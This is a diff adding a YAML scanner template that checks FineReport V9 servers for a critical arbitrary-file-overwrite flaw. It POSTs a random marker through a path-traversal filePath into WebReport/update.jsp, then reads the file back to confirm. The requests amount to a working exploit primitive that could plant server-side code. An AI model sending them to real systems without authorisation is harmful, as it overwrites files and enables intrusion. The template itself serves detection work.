@@ -1,0 +1,20 @@
+id: poc-yaml-finereport-v9-design-save-svg-anyfile-coverage
+info:
+  name: 帆软报表 V9 design_save_svg 任意文件覆盖漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: finereport
+variables:
+  t1: base64(random_str(4))
+requests:
+- method: POST
+  path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp
+  headers:
+    Content-Type: application/json
+  data: '{"__CONTENT__":"{{.t1}}"}'
+  expression: status_code == 200
+- method: GET
+  path: /WebReport/update.jsp
+  expression: status_code == 200 && contains(body,t1)
+transport: http
